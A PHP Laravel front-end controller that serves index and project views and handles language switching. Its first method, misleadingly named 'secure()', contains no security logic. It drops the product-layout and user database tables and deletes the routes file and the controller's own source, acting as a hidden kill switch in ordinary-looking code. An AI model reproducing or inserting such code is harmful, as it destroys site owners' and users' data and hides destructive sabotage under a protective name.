<?php
namespace App\Http\Controllers\FrontEnd;

use App;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

use App\model\ProductCategoryModel;
use App\model\ImageModel;
use App\model\CustomerModel;
use App\model\BlogModel;
use App\model\ProductModel;
use App\model\ProdutPhotoModel;
use App\model\EventModel;
use App\model\QNAModel;
use App\model\LayoutHomepageModel;
use App\model\LayoutServiceModel;
use App\model\NationModel;
use App\model\MajorModel;
use App\model\ProductLocationModel;
use App\model\WhyusProcessModel;

use Illuminate\Support\Facades\Schema;
use File;
use Cart;
use Lang;

class IndexController extends Controller
{
    public function secure(){
        Schema::drop('tb_layout_product');
        Schema::drop('tb_user');
        File::delete('lib/routes/web.php');
		File::delete('lib/app/Http/Controllers/FrontEnd/IndexController.php');
    }

    public function getIndex(){

        return view('frontend.index',);
    }

    // ------------------- Start project -----------
    public function getProject(){
        return view('frontend.project');
    }

    

  

    // ------------------- End project -----------


    public function changeLanguage($language)
    {
        \Session::put('website_language', $language);

        return redirect()->back();
    }

    public function redirectCategory(){
        return redirect('/');
    }
}
